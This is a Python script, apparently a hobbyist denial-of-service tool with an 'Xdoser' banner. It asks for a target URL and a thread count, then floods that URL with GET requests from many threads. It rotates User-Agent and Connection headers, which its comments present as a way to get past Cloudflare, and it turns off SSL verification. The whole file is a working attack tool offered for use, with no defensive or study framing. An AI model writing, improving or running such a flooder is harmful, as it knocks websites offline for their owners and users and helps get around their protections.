import os
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import signal
import random
import time

# Flag to stop threads
stop_flag = False

# Function to stop the script on Ctrl+C
def signal_handler(signal, frame):
    global stop_flag
    print("\nStopping the script...")
    stop_flag = True

signal.signal(signal.SIGINT, signal_handler)

# Clear screen
os.system('cls' if os.name == 'nt' else 'clear')

# Banner
banner = '''
____  ___   .___                         
\   \/  / __| _/____  ______ ___________ 
 \     / / __ |/  _ \/  ___// __ \_  __ \
 /     \/ /_/ (  <_> )___ \\  ___/|  | \/
/___/\  \____ |\____/____  >\___  >__|   
      \_/    \/          \/     \/       

'''

print(banner)

# Target URL
url = input("Enter the target URL: ")

# Cloudflare bypass headers
headers = {
    'Host': 'example.com',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Accept-Encoding': 'gzip, deflate',
    'Connection': 'keep-alive',
    'Upgrade-Insecure-Requests': '1',
    'Cache-Control': 'max-age=0'
}

# Create a session with Cloudflare bypass headers
session = requests.Session()
session.headers.update(headers)

# Function to send requests
def send_request():
    while not stop_flag:
        try:
            session.headers.update({
                'User-Agent': random.choice([
                    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
                    'Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0']),
                'Connection': random.choice(['keep-alive', 'close'])
            })
            response = session.get(url, verify=False)  # Disable SSL verification for testing
            print(f'Request sent. Status code: {response.status_code}')
        except requests.RequestException as e:
            print(f'Request failed: {e}')
        time.sleep(random.uniform(0.1, 1.0))

# Get the number of threads from the user
num_threads = int(input("Enter the number of threads: "))

# Use a thread pool to manage threads
with ThreadPoolExecutor(max_workers=num_threads) as executor:
    futures = {executor.submit(send_request): i for i in range(num_threads)}
    
    try:
        for future in as_completed(futures):
            future.result()  # Wait for each thread to complete
    except KeyboardInterrupt:
        stop_flag = True

print("All threads have been stopped.")
